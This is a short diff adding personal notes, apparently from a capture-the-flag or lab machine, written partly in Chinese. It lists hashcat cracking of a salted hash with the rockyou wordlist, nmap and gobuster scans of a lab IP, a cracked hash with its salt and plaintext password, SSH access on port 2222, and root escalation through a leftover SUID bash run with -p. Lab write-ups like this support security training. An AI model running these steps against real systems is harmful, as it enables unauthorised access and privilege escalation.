@@ -1,0 +1,16 @@
+hashcat -m 1710 hash1 /usr/share/wordlists/rockyou.txt
+要把salt手動加到hash後面
+
+nmap -sV -sC 10.10.95.41 -Pn > nmap.txt
+nmap -p- 10.10.95.41  > nmapall.txt
+gobuster dir  -u http://10.10.95.41/ -w /usr/share/dirb/wordlists/common.txt -x txt,php,py,cgi > gobuster.txt
+
+
+november16
+6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05:november16
+
+
+使用november16 密碼可以直接連入2222端口
+
+使用-p指令繼承環境變量取得root
+/home/james/.suid_bash -p
